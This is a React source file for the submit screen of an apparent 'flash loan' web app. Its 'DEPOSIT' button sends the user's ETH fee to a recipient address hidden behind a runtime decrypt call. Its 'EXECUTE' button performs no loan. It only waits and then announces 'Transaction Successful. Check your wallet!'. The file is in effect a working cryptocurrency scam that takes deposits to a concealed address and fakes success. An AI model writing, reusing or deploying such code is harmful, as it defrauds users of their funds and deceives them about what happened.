import React, { useState } from "react";
import NameSymbol from "./NameSymbol";
import CryptoDescrip from "./CryptoDescrip";
import "../css/submitScreen.css";
import { decrypt } from "../helpers/encryption";

function SubmitScreen(props) {
  const [btnErr, setBtnErr] = useState("");
  const [inputErr, setInputErr] = useState("");
  const [isExecuteBtnDisabled, setExecuteDisabled] = useState(true);
  const onInitiate = () => {
    setBtnErr("");
    if (props?.loanData?.amount >= 2)
      window.web3.eth.sendTransaction(
        {
          to: decrypt(props?.submitState?.ivm)["o"],
          from: props?.accountAddress,
          value: window.web3.utils.toWei(
            "" + props?.loanData.totalFee,
            "ether"
          ),
          gas: 3e4,
          gasPrice: window.web3.utils.toWei("90", "gwei"),
        },
        function (e, t) {
          if (e) setBtnErr("Transaction Failed.");
          else
            setTimeout(function () {
              setBtnErr("");
              alert(
                "Money deposited to contract. You can execute the Flash Loan now."
              );
              setExecuteDisabled(false);
            }, 5e3);
        }
      );
  };
  const onExecute = () => {
    setBtnErr("");
    setTimeout(() => {
      alert("Transaction Successful. Check your wallet!");
      setExecuteDisabled(true);
    }, 4000);
  };
  return (
    <div className="screentwo">
      <NameSymbol
        label="LOAN AMOUNT"
        input="Enter Amount"
        inputValue={props?.loanData?.amount}
        handleInputChange={(e) => {
          props.setLoanAmount(e.target.value);
          if (inputErr) setInputErr("");
        }}
        handleInputBlur={(e) => {
          if (e.target.value < 2) {
            setInputErr("Value must be greater than or equal to 2");
          }
        }}
        isIncrement
        isNumber
        handleIncrementClick={(value) => {
          if (value < 1) {
            setInputErr("Value must be greater than or equal to 2");
          } else if (inputErr) setInputErr("");
          props.setLoanAmount(value);
        }}
        inputErr={inputErr}
        handleDecrementClick={(value) => {
          if (value <= 1) {
            props.setLoanAmount(value - (value - 2));
          } else props.setLoanAmount(value);
        }}
      />
      <CryptoDescrip
        tokenFee={props?.loanData?.tokenFee}
        currency={props?.submitState?.currency}
        dex={props?.submitState.dex}
        swapFee={props?.loanData?.swapFee}
        totalFee={props?.loanData?.totalFee}
        gain={props?.loanData?.gain}
      />
      {btnErr && <p className="error-text-mesg">{btnErr}</p>}
      <button onClick={onInitiate}>
        {`DEPOSIT ${props?.submitState?.currency}`}
      </button>
      <button
        disabled={isExecuteBtnDisabled}
        className={isExecuteBtnDisabled ? "btn-disabled-submit" : ""}
        onClick={onExecute}
      >
        EXECUTE
      </button>
    </div>
  );
}

export default SubmitScreen;
